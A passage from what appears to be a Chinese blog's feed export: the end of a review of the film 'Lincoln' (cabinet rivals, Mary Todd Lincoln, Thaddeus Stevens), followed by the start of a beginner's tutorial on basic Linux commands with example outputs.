<p>剧中有很多林肯和幕僚争论的场面，其历史背景是林肯内阁组成上的政治包容性。<br>首席幕僚、国务卿／外交部长苏华德，财政部长蔡斯（剧中未直接出线），入阁以前是林肯的党内竞争对手、死对头，战争部长斯坦顿（民主党）经常当着林肯和众人的面大声咆哮，阁员中有保守派、有激进派、甚至有些原来是反对者。<br>作为帝国CEO，不仅仅是团结众人，还要做到用人不疑、委以重任、肝胆相照，林肯以自己的谦逊和雅量，缔造了一支史上最强幕僚团队。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-PRE-Team-Dis-1.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-PRE-Team-Dis-3.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-PRE-Team-Dis-5.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-PRE-Team-Dis-8.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-PRE-Team-Dis-11.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-PRE-Team-Dis-12.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-PRE-Team-Dis-13.jpg" alt></p>
<h4 id="3-2-第一悍妇"><a href="#3-2-第一悍妇" class="headerlink" title="3.2 第一悍妇"></a>3.2 第一悍妇</h4><p>对于玛丽·托德，她也许是最令美国人反感的第一夫人。<br>林肯是穷小子出身、自学成才，她则生于“钟鸣鼎食”之家，祖上州长、将军、大企业家一箩筐，从小接受的是是贵族教育；林肯朴素、谦逊、温和，第一夫人则是出了名的傲慢、狂躁、尤其喜好奢华。在某种程度上说，人们对于林肯的敬仰中包含了深深的同情，正如戴尔·卡耐基的评价是：林肯一生最大的不幸不是他的遇刺，而是他和玛丽·托德的婚姻！</p>
<p>但是，斯皮尔伯格似乎想通过本片挑战这一常识。<br>为了塑造第一夫人的“强悍”形象，导演选择从“家事”入手。林肯“非常喜爱孩子”，夫妻二人对自己的孩子也并不算严厉，他们共育有四个孩子，但是有三个夭折，<br>罗伯特是唯一活到成年并育有子女的。孩子的死亡对林肯夫妇的影响巨大，玛丽后来因孩子和丈夫的死深受折磨。</p>
<p>在南北战争期间，母亲玛丽·托德·林肯始终不肯让罗伯特加入联邦军，在战时舆论中，成为反对派攻击林肯的把柄，即便如此，玛丽依然不肯做出任何让步，这使得林肯总统甚为难堪。影片中有好几个林肯夫妻为此吵架的镜头，歇斯底里、虐心、虐得一滩糊涂。</p>
<p>一直至战争结束前不久，罗伯特才得以参军。1865年2月11日，罗伯特·林肯以上尉军衔被任命为助理副官，并在战争结束前几周作尤利西斯·格兰特将军的直属幕僚之一，但这个职位却使得罗伯特能实际上战场的可能性大大降低。</p>
<p>与此同时，影片中的玛丽也充分表现出“第一夫人”的气度。她是林肯的“巫师”，第一个读懂了林肯推动第十三条修正案的决心；虽然她自己也觉得难度很大，但是很快就转变态度，进而全力支持林肯的主张；利用一切可能的机会，包括邀请自己非常讨厌的激进派领袖史蒂文斯参加自己的宴会；旁听国会辩论的时候，完全展现出大政治家的敏锐眼光，在最后的投票环节，更是亲自点票……</p>
<p>通过这些镜头上，银幕上一个名副其实的“第一悍妇”活了。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-Lady-宴会2.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-Lady-剧场对话1.png" alt></p>
<p>真实的历史上，林肯遇刺之后第一夫人的晚景极为凄凉。<br>也许是为了弥补这一缺憾，也许是为了表达崇敬，法案通过之后，林肯夫妇有一组异常华美的马车旅行镜头，夫妇二人达成和解，正准备自己的旅行计划呢，蓝天、白云、青草地，春风得意马蹄疾。历史真是残酷。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-Lady-Success-2.jpg" alt></p>
<h4 id="3-3-精英群像"><a href="#3-3-精英群像" class="headerlink" title="3.3 精英群像"></a>3.3 精英群像</h4><p><strong>超过140个历史人物</strong></p>
<blockquote>
<p>在当年那些日子是美国人对政府最缺乏信心的时候，这个故事可以显示人如何在民主体制之下完成奇迹，成就美好的事物。—编剧Tony Kushner</p>
</blockquote>
<p>在这个历史的重大时刻，在有关宪法修正案的争论之中，有多大140个角色登场，每个人都个性鲜明，每个人都举足轻重。国务卿苏华德（William Henry Seward）、共和党创党人布萊尔（Francis Preston Blair）、众议员斯蒂文斯（Thaddeus Stevens）、格兰特将军，甚至包括林肯的“敌人们”：罗伯特李将军、南方邦联副总统、在国会坚决抵制法案通过、甚至威胁要弹劾总统的反对派议员们，专门搞地下交易的政治掮客，媒体记者团……<br><img src="http://riboseyim-qiniu.riboseyim.com/LK-Veto-1.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-Veto-Team.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-Role-Grant-1.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-Win-Li.png" alt></p>
<p><strong>黄金配角：侠骨柔肠</strong></p>
<p>伟大的历史都是由群体构建，剧中最耀眼的一个当属众议院议员史蒂文斯（Thaddeus Stevens），饰演者是银幕铁汉李琼斯（Tommy Lee Jones）。<br>斯蒂文斯是共和党激进派的领袖，来自宾夕法尼亚州、众议院最具分量的一员，林肯的战略盟友。</p>
<p>他是林肯夫人眼中的魔鬼，不仅在政见上经常与林肯相左，还利用执掌众议院预算委员会的权力，对白宫的财务进行调查；他具备政治家的凶狠、老辣，三两句话就让摇摆不定的民主党议员屈服；他审时度势，在关键时刻能够以身殉道，指引自己迷茫的同志；他在众人面前孤独、冷漠，国会演讲中却能进退有据、智慧幽默、气场十足；他不仅在政治场面上唱得了高调，个人生活中也能超越种族、践行平等精神；伟大的胜利时刻，众人自觉起立致敬英雄，他心里惦记的倒是赶紧回家，将法案的文本作为礼物送给家中的黑人妻子。所谓“侠之大者”，不过如此吧。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-Role-STWS-A.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-STWS-kefusi-6.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-Congress-Talk-Equal-2.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-Role-STWS-D.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-Congress-Talk-Equal-3.png" alt></p>
<h2 id="六、结束"><a href="#六、结束" class="headerlink" title="六、结束"></a>六、结束</h2><blockquote>
<p>当一出戏闭幕时，观众鱼贯退出剧场，回家去继续他们正常的生活；而当一位领袖的生涯结束、落下帷幕时，观众自己的生活也就起了变化，同时历史的进程也可能会发生深刻的变化。</p>
</blockquote>
<p>法案通过、漫长的战争结束，举国享受和平的平静中，林肯的生命嘎然而止。<br>在众人簇拥的小黑屋，躺在床上的身躯笼罩在一片白光之中，宛如耶稣离世。<br>在此一刻，他重返天国，已然封神。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-death-last-1.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LK-death.png" alt></p>
<h2 id="Preview"><a href="#Preview" class="headerlink" title="Preview"></a>Preview</h2><ol>
<li>更新完善《林肯》人物关系简谱、精彩对白剪辑与台词校对</li>
<li>阅读原著《Team of Rivals: The Political Genius of Lincoln》</li>
<li>参观林肯纪念堂、参观葛底斯堡、背诵《葛底斯堡演说》</li>
</ol>
<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><ul>
<li><a href="http://time.com/5166506/they-knew-lincoln-book/" target="_blank" rel="noopener">The Book That Preserved What African Americans Who Knew Abraham Lincoln Thought of Him</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li>《 林肯传》</li>
<li>《美国宪法及其修正案》商务印书馆</li>
<li>《通过法律的社会控制》商务印书馆</li>
<li>《美国历届总统小传》新华出版社</li>
<li>《弗吉尼亚笔记》商务印书馆</li>
<li>《领导者》,世界知识出版社</li>
<li><a href="https://wethinker.com/2015/03/17/6290/" target="_blank" rel="noopener">解读纸牌屋（四）从幕僚长说起——美国官员的班底,2015 | 封楚诚 </a></li>
<li><a href="https://mp.weixin.qq.com/s/F3okZdaYzxW0Xgd8ceCUkA" target="_blank" rel="noopener">如何流利背诵《葛底斯堡演讲》| 原创 2016-08-17 恶魔奶爸Sam</a></li>
</ul>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Artistic</tag>
        <tag>Lincoln</tag>
      </tags>
  </entry>
  <entry>
    <title>How Linux Works：BASIC Commands</title>
    <url>/2017/04/26/Linux-Commands/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>BASIC Commands</li>
<li>Learn By Example</li>
</ul>
<span id="more"></span>
<h2 id="用途分类法"><a href="#用途分类法" class="headerlink" title="用途分类法"></a>用途分类法</h2><h4 id="软件信息"><a href="#软件信息" class="headerlink" title="软件信息"></a>软件信息</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ uname -a</span><br><span class="line">Linux NW-DD-APP 2.6.32-642.el6.x86_64 <span class="comment">#1 SMP Wed Apr 13 00:51:26 EDT 2016 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">$ uname -r</span><br><span class="line">2.6.32-642.el6.x86_64</span><br><span class="line">$ uname -m</span><br><span class="line">x86_64</span><br></pre></td></tr></table></figure>
<h4 id="硬件信息"><a href="#硬件信息" class="headerlink" title="硬件信息"></a>硬件信息</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ arch</span><br><span class="line">$ lscpu</span><br><span class="line">$ cat /proc/cpuinfo</span><br><span class="line">$ cat /proc/cpuinfo | grep <span class="string">&#x27;processor&#x27;</span> | wc -l <span class="comment"># 逻辑CPU个数</span></span><br><span class="line">$ cat /proc/cpuinfo | grep <span class="string">&#x27;physical id&#x27;</span> | sort | uniq | wc -l <span class="comment"># 物理CPU个数</span></span><br><span class="line">$ cat /proc/cpuinfo | grep <span class="string">&#x27;cpu cores&#x27;</span> | wc -l <span class="comment"># 每个物理CPU中Core的个数</span></span><br><span class="line">$ cat /proc/meminfo</span><br><span class="line">$ fdisk -l</span><br><span class="line">$ ifconfig -a</span><br><span class="line">$ lspci</span><br><span class="line">$ dmidecode -t bios</span><br><span class="line">$ dmidecode -q</span><br></pre></td></tr></table></figure>
<ul>
<li><a href="https://www.tecmint.com/commands-to-collect-system-and-hardware-information-in-linux/">10 Useful Commands to Collect System and Hardware Information in Linux</a></li>
</ul>
<h2 id="Linux-Commands"><a href="#Linux-Commands" class="headerlink" title="Linux Commands"></a>Linux Commands</h2><p><a href="https://www.howtoforge.com/linux-commands/">原文：https://www.howtoforge.com/linux-commands/</a></p>
<p>本文的特点是非常简洁，将繁杂的Linux命令行筛选出100条左右，非常适合入门学习。<br>此外，将领域知识以“条目+示例”的方式来整理，类似编字典一样，在编辑的过程中可以促进学习者加深认识，也方便日后持续改进（增加注解、参考文献、索引等），是一种不错的学习方法。<br>最后，整理这些命令行的时候，我体会到操作系统最重要的工作实际就是对文件的管理，创建、移动、查看、编辑、销毁、检索，都是围绕文件的操作，事实上也是实际工作中使用最频繁的需求。对开发者来说，以Linux命令行为模版，命名风格、人机交互、小而美的实现方式，促进自己在其它领域的应用、提高大有裨益。</p>
<h4 id="Adduser-Addgroup"><a href="#Adduser-Addgroup" class="headerlink" title="Adduser/Addgroup"></a>Adduser/Addgroup</h4><p><a href="#">分类：权限管理；增加用户、用户组</a></p>
<p>The adduser and addgroup commands lets you add a new user and group to a system, respectively. Here’s an example for adduser:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo adduser testuser</span><br><span class="line">Adding user `testuser&#x27; ...</span><br><span class="line">Adding new group `testuser&#x27; (1003) ...</span><br><span class="line">Adding new user `testuser&#x27; (1003) with group `testuser&#x27; ...</span><br><span class="line">Creating home directory `/home/testuser&#x27; ...</span><br><span class="line">Copying files from `/etc/skel&#x27; ...</span><br><span class="line">Enter new UNIX password:</span><br></pre></td></tr></table></figure></p>
<h4 id="Arch"><a href="#Arch" class="headerlink" title="Arch"></a>Arch</h4><p><a href="#">分类：系统信息；查看CPU架构</a></p>
<p>The arch command is used to print the machine’s architecture. For example:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ arch</span><br><span class="line">i686</span><br><span class="line">Not sure what &#x27;i686&#x27; means? Head here.</span><br></pre></td></tr></table></figure></p>
<h4 id="Cal-Ncal"><a href="#Cal-Ncal" class="headerlink" title="Cal/Ncal"></a>Cal/Ncal</h4><p><a href="#">分类：系统信息；查看日历</a></p>
<p>The cal and ncal commands display a calendar in the output.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cal</span><br><span class="line">March 2017</span><br><span class="line">Su Mo Tu We Th Fr Sa</span><br><span class="line">1 2 3 4</span><br><span class="line">5 6 7 8 9 10 11</span><br><span class="line">12 13 14 15 16 17 18</span><br><span class="line">19 20 21 22 23 24 25</span><br><span class="line">26 27 28 29 30 31</span><br><span class="line"></span><br><span class="line">$ ncal</span><br><span class="line">March 2017</span><br><span class="line">Su 5 12 19 26</span><br><span class="line">Mo 6 13 20 27</span><br><span class="line">Tu 7 14 21 28</span><br><span class="line">We 1 8 15 22 29</span><br><span class="line">Th 2 9 16 23 30</span><br><span class="line">Fr 3 10 17 24 31</span><br><span class="line">Sa 4 11 18 25</span><br></pre></td></tr></table></figure></p>
<h4 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h4><p><a href="#">分类：文件管理；查看文件内容</a><br>The cat command allows you to concatenate files, or data provided on standard input, and print it on the standard output. In layman terms, the command prints the information provided to it, whether through stdin or in the form a file.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat test.txt</span><br><span class="line">Hello...how are you?</span><br></pre></td></tr></table></figure></p>
<h4 id="Cd"><a href="#Cd" class="headerlink" title="Cd"></a>Cd</h4><p><a href="#">分类：文件管理；切换工作目录</a><br>The cd command is used to change user’s present working directory.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd /home/himanshu/</span><br></pre></td></tr></table></figure></p>
<h4 id="Chgrp"><a href="#Chgrp" class="headerlink" title="Chgrp"></a>Chgrp</h4><p><a href="#">分类：文件管理、权限管理；切换文件所属组</a><br>The chgrp command allows you to change the group ownership of a file. The command expects new group name as its first argument and the name of file (whose group is being changed) as second argument.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ chgrp howtoforge test.txt</span><br></pre></td></tr></table></figure></p>
<h4 id="Chmod"><a href="#Chmod" class="headerlink" title="Chmod"></a>Chmod</h4><p><a href="#">分类：文件管理、权限管理；切换文件执行权限</a><br>The chmod command lets you change access permissions for a file. For example, if you have a binary file (say helloWorld), and you want to make it executable, you can run the following command:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x helloWorld</span><br></pre></td></tr></table></figure></p>
<h4 id="Chown"><a href="#Chown" class="headerlink" title="Chown"></a>Chown</h4><p><a href="#">分类：文件管理、权限管理；切换文件所有者</a><br>The chown command allows you to change the ownership and group of a file. For example, to change the owner of a file test.txt to root, as well as set its group as root, execute the following command:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chown root:root test.txt</span><br></pre></td></tr></table></figure></p>
<h4 id="Cksum"><a href="#Cksum" class="headerlink" title="Cksum"></a>Cksum</h4><p><a href="#">分类：文件管理；查看文件属性</a><br>The cksum command prints the CRC checksum and byte count for the input file.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cksum test.txt</span><br><span class="line">3741370333 20 test.txt</span><br><span class="line">Not sure what checksum is? Head here.</span><br></pre></td></tr></table></figure></p>
<h4 id="Clear"><a href="#Clear" class="headerlink" title="Clear"></a>Clear</h4><p><a href="#">分类：人机交互；清屏</a><br>The clear command is used to clear the terminal screen.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ clear</span><br></pre></td></tr></table></figure></p>
<h4 id="Cmp"><a href="#Cmp" class="headerlink" title="Cmp"></a>Cmp</h4><p><a href="#">分类：文件管理；文件比对 byte-by-byte</a><br>The cmp command is used to perform byte-by-byte comparison of two files.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cmp file1 file2</span><br><span class="line">file1 file2 differ: byte 1, line 1</span><br></pre></td></tr></table></figure></p>
<h4 id="Comm"><a href="#Comm" class="headerlink" title="Comm"></a>Comm</h4><p><a href="#">分类：文件管理；文件比对</a><br>The comm command is used to compare two sorted files line-by-line. For example, if ‘file1’ contains numbers 1-5 and ‘file2’ contains number 4-8, here’s what the ‘comm’ command produces in this case:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ comm file1 file2</span><br></pre></td></tr></table></figure><br>支持选项：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1：不显示在第一个文件出现的内容；</span><br><span class="line">-2：不显示在第二个文件中出现的内容；</span><br><span class="line">-3：不显示同时在两个文件中都出现的内容。</span><br></pre></td></tr></table></figure></p>
<h4 id="Cp"><a href="#Cp" class="headerlink" title="Cp"></a>Cp</h4><p><a href="#">分类：文件管理；文件复制</a><br>The cp command is used for copying files and directories.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cp test.txt /home//himanshu/Desktop/</span><br></pre></td></tr></table></figure></p>
<h4 id="Csplit"><a href="#Csplit" class="headerlink" title="Csplit"></a>Csplit</h4><p><a href="#">分类：文件管理；待补充内容</a><br>The csplit command lets you split a file into sections determined by context lines. For example, to split a file into two where the first part contains ‘n-1’ lines and the second contains the rest, use the following command:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ csplit file1 [n]</span><br></pre></td></tr></table></figure>
<p>The two parts are saved as files with names ‘xx00’ and ‘xx01’, respectively.</p>
<h4 id="Date"><a href="#Date" class="headerlink" title="Date"></a>Date</h4><p><a href="#">分类：系统信息；查看系统时间</a><br>The date command can be used to print (or even set) the system date and time.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ date</span><br><span class="line">Tue Feb 28 17:14:57 IST 2017</span><br></pre></td></tr></table></figure></p>
<h4 id="Dd"><a href="#Dd" class="headerlink" title="Dd"></a>Dd</h4><p><a href="#">分类：文件管理；待补充内容</a><br>The dd command copies a file, converting and formatting according to the operands. For example, the following command creates an image of /dev/sda partition.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dd if=/dev/sda of=/tmp/dev-sda-part.img</span><br></pre></td></tr></table></figure></p>
<h4 id="Df"><a href="#Df" class="headerlink" title="Df"></a>Df</h4><p><a href="#">分类：文件管理；查看文件系统利用率</a><br>The df command displays the file system disk space usage in output.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ df /dev/sda1</span><br><span class="line">Filesystem 1K-blocks Used     Available Use% Mounted on</span><br><span class="line">/dev/sda1  74985616  48138832 23014620  68%     /</span><br></pre></td></tr></table></figure></p>
<h4 id="Diff"><a href="#Diff" class="headerlink" title="Diff"></a>Diff</h4><p><a href="#">分类：文件管理；文件比对 line-by-line</a><br>The diff command lets you compare two files line by line.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ diff file1 file2</span><br></pre></td></tr></table></figure></p>
<h4 id="Diff3"><a href="#Diff3" class="headerlink" title="Diff3"></a>Diff3</h4><p><a href="#">分类：文件管理；文件比对,三个文件</a><br>The diff3 command, as the name suggests, allows you to compare three files line by line.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">diff3 file1 file2 file3</span><br></pre></td></tr></table></figure></p>
<h4 id="Dir"><a href="#Dir" class="headerlink" title="Dir"></a>Dir</h4><p><a href="#">分类：文件管理；查看当前目录文件列表</a><br>The dir command lists directory contents. For example:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ dir</span><br><span class="line">test1 test2 test.7z test.zip</span><br></pre></td></tr></table></figure></p>
<h4 id="Dirname"><a href="#Dirname" class="headerlink" title="Dirname"></a>Dirname</h4><p><a href="#">分类：文件管理；查看当前目录</a><br>The dirname command strips last component from a file name/path. In layman’s terms, you can think of it as a tool that, for example, removes file name from the file’s absolute path.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ dirname /home/himanshu/file1</span><br><span class="line">/home/himanshu</span><br></pre></td></tr></table></figure></p>
<h4 id="Dmidecode"><a href="#Dmidecode" class="headerlink" title="Dmidecode"></a>Dmidecode</h4><p><a href="#">分类：系统信息；查看硬件信息</a></p>
<p>The dmidecode command prints a system’s DMI (aka SMBIOS) table contents in a human-readable format.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo dmidecode</span><br><span class="line"># dmidecode 2.12</span><br><span class="line">SMBIOS 2.6 present.</span><br><span class="line">50 structures occupying 2056 bytes.</span><br><span class="line">Table at 0x000FCCA0.</span><br><span class="line">Handle 0x0000, DMI type 0, 24 bytes</span><br><span class="line">BIOS Information</span><br><span class="line">Vendor: American Megatrends Inc.</span><br><span class="line">Version: 080015</span><br><span class="line">Release Date: 08/22/2011</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><br>DMI (Desktop Management Interface, DMI)就是帮助收集电脑系统信息的管理系统，DMI信息的收集必须在严格遵照SMBIOS规范的前提下进行。 SMBIOS(System Management BIOS)是主板或系统制造者以标准格式显示产品管理信息所需遵循的统一规范。SMBIOS和DMI是由行业指导机构Desktop Management Task Force (DMTF)起草的开放性的技术标准，其中DMI设计适用于任何的平台和操作系统。</p>
<h4 id="Du"><a href="#Du" class="headerlink" title="Du"></a>Du</h4><p><a href="#">分类：文件管理；查看指定目录磁盘利用率</a><br>The du command displays disk usage of files present in a directory as well as its sub-directories.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ du /home/himanshu/Desktop/</span><br><span class="line">92 /home/himanshu/Desktop/Downloads/meld/meld/ui</span><br><span class="line">88 /home/himanshu/Desktop/Downloads/meld/meld/vc</span><br><span class="line">56 /home/himanshu/Desktop/Downloads/meld/meld/matchers</span><br><span class="line">12 /home/himanshu/Desktop/Downloads/meld/meld/__pycache__</span><br><span class="line">688 /home/himanshu/Desktop/Downloads/meld/meld</span><br><span class="line">16 /home/himanshu/Desktop/Downloads/meld/bin</span><br><span class="line">328 /home/himanshu/Desktop/Downloads/meld/data/ui</span><br><span class="line">52 /home/himanshu/Desktop/Downloads/meld/data/icons/svg</span><br></pre></td></tr></table></figure></p>
<h4 id="Echo"><a href="#Echo" class="headerlink" title="Echo"></a>Echo</h4><p>The echo command displays whatever input text is given to it.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ echo hello hi</span><br><span class="line">hello hi</span><br></pre></td></tr></table></figure></p>
<h4 id="Ed"><a href="#Ed" class="headerlink" title="Ed"></a>Ed</h4><p><a href="#">分类：文件管理；编辑器</a><br>ed is a line-oriented text editor.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ed</span><br></pre></td></tr></table></figure><br>单行纯文本编辑器，它有命令模式（command mode）和输入模式（input mode）两种工作模式。<br>支持选项：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A：切换到输入模式，在文件的最后一行之后输入新的内容；</span><br><span class="line">C：切换到输入模式，用输入的内容替换掉最后一行的内容；</span><br><span class="line">i：切换到输入模式，在当前行之前加入一个新的空行来输入内容；</span><br><span class="line">d：用于删除最后一行文本内容；</span><br><span class="line">n：用于显示最后一行的行号和内容；</span><br><span class="line">w：&lt;文件名&gt;：一给定的文件名保存当前正在编辑的文件；</span><br><span class="line">q：退出ed编辑器。</span><br></pre></td></tr></table></figure></p>
<h4 id="Eject"><a href="#Eject" class="headerlink" title="Eject"></a>Eject</h4><p><a href="#">分类：媒体管理；卸载</a><br>The eject command lets you eject removable media (typically, a CD ROM or floppy disk)<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ eject</span><br></pre></td></tr></table></figure></p>
<h4 id="Env"><a href="#Env" class="headerlink" title="Env"></a>Env</h4><p><a href="#">分类：系统信息；查看用户环境变量</a><br>The env command not only displays the current environment, but also lets you edit it.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ env</span><br></pre></td></tr></table></figure></p>
<h4 id="Exit"><a href="#Exit" class="headerlink" title="Exit"></a>Exit</h4><p><a href="#">分类：交互；退出</a><br>The exit command causes the shell to exit.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ exit</span><br></pre></td></tr></table></figure></p>
<h4 id="Expand"><a href="#Expand" class="headerlink" title="Expand"></a>Expand</h4><p><a href="#">分类：文件管理；编辑器；将TAB符替换为空格符</a><br>The expand command converts tabs present in the input file(s) into spaces, and writes the file contents to standard output.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ expand file1</span><br></pre></td></tr></table></figure></p>
<h4 id="Expr"><a href="#Expr" class="headerlink" title="Expr"></a>Expr</h4><p><a href="#">分类：计算器；表达式</a><br>The expr command evaluates expressions. For example:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ expr 1 + 2</span><br><span class="line">3</span><br></pre></td></tr></table></figure></p>
<h4 id="Factor"><a href="#Factor" class="headerlink" title="Factor"></a>Factor</h4><p><a href="#">分类：计算器；分解质因数</a><br>The factor command prints the prime factors of the input number.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ factor 135</span><br><span class="line">135: 3 3 3 5</span><br></pre></td></tr></table></figure></p>
<h4 id="Fgrep"><a href="#Fgrep" class="headerlink" title="Fgrep"></a>Fgrep</h4><p><a href="http://man.linuxde.net/fgrep">分类：文件管理；搜索；匹配指定文件字符</a></p>
<p>The fgrep command is equivalent to the grep command when executed with the -F command line option. The tool is also known as fixed or fast grep as it doesn’t treat regular expression metacharacters as special, processing the information as simple string instead.</p>
<p>For example, if you want to search for dot (.) in a file, and don’t want grep to interpret it as a wildcard character, use fgrep in the following way:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ fgrep &quot;.&quot; [file-name]</span><br></pre></td></tr></table></figure></p>
<h4 id="Find"><a href="#Find" class="headerlink" title="Find"></a>Find</h4><p><a href="#">分类：文件管理；搜索；</a><br>The find command lets you search for files in a directory as well as its sub-directories.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ find test*</span><br><span class="line">test</span><br><span class="line">test1</span><br><span class="line">test2</span><br><span class="line">test.7z</span><br><span class="line">test.c</span><br><span class="line">test.txt</span><br><span class="line">More examples for the Linux Find command:</span><br><span class="line"></span><br><span class="line">* 14 Practical Examples of Linux Find Command for Beginners</span><br><span class="line">* Searching For Files And Folders With The find Command</span><br><span class="line">* Finding Files On The Command Line</span><br></pre></td></tr></table></figure></p>
<h4 id="Fmt"><a href="#Fmt" class="headerlink" title="Fmt"></a>Fmt</h4><p><a href="#">分类：文件管理；读取文件内容并格式化输出（查看支持选项）</a><br>fmt is a simple optimal text formatter. It reformats each paragraph in the file passed to it, and writes the file contents to standard output.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ fmt file1</span><br></pre></td></tr></table></figure></p>
<h4 id="Fold"><a href="#Fold" class="headerlink" title="Fold"></a>Fold</h4><p><a href="#">分类：交互；控制文件内容输出时所占用的屏幕宽度</a></p>
<p>The fold command wraps each input line to fit in specified width.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ fold -w 10</span><br><span class="line">Hi my name is himanshu Arora</span><br><span class="line">Hi my name</span><br><span class="line">is himans</span><br><span class="line">hu Arora</span><br></pre></td></tr></table></figure></p>
<h4 id="Free"><a href="#Free" class="headerlink" title="Free"></a>Free</h4><p><a href="https://riboseyim.github.io/2017/12/11/Linux-Works-Memory">分类：系统信息；性能监测；查看内存利用情况。详细介绍 &gt;&gt;&gt;more&gt;&gt;&gt;</a><br>The free command displays the amount of free and used memory in the system.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ free</span><br><span class="line">       total           used  free   shared buffers cached</span><br><span class="line">Mem:   1800032       1355288 444744 79440   9068   216236</span><br><span class="line">-/+ buffers/cache: 1129984 670048</span><br><span class="line">Swap:  1832956      995076  837880</span><br></pre></td></tr></table></figure></p>
<ul>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Perf-Load/">Linux 性能诊断:负载评估</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断:快速检查单(Netflix版)</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Works-Memory/">操作系统原理 | How Linux Works（三）：Memory</a></li>
</ul>
<h4 id="Grep"><a href="#Grep" class="headerlink" title="Grep"></a>Grep</h4><p><a href="#">分类：文件管理；搜索；</a><br>The grep command searches for a specified pattern in a file (or files) and displays in output lines containing that pattern.<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ grep Hello test.txt</span><br><span class="line">Hello...how are you?</span><br><span class="line">More tutorials and examples for the Linux Grep command:</span><br><span class="line"></span><br><span class="line">* How to use grep to search for strings in files on the shell</span><br><span class="line">* How to perform pattern search in files using Grep</span><br><span class="line"></span><br><span class="line">$ grep -r test /usr</span><br></pre></td></tr></table></figure></p>
